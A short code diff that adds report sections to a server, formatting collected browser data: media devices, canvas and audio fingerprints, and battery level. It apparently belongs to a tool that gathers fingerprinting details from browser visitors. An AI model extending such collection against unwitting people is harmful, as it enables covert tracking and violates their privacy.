@@ -270,6 +270,17 @@ async function startServer() {
         } catch(e) {}
       }
 
+      if (data.media_devices) {
+        addSection(`📷 MEDIA_PERIPHERALS`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
+      }
+
+      if (data.canvas_fp || data.audio_fp) {
+        let fpt = ``;
+        if (data.canvas_fp) fpt += `├ Canvas: <code>${escapeHTML(data.canvas_fp)}</code>\n`;
+        if (data.audio_fp) fpt += `└ Audio: <code>${escapeHTML(data.audio_fp)}</code>`;
+        if (fpt) addSection(`🧬 BROWSER_FINGERPRINTS`, fpt);
+      }
+
       if (data.battery_level) {
         addSection(`🔋 POWER_TELEMETRY`,
                     `├ Level: <code>${data.battery_level}</code>\n` +
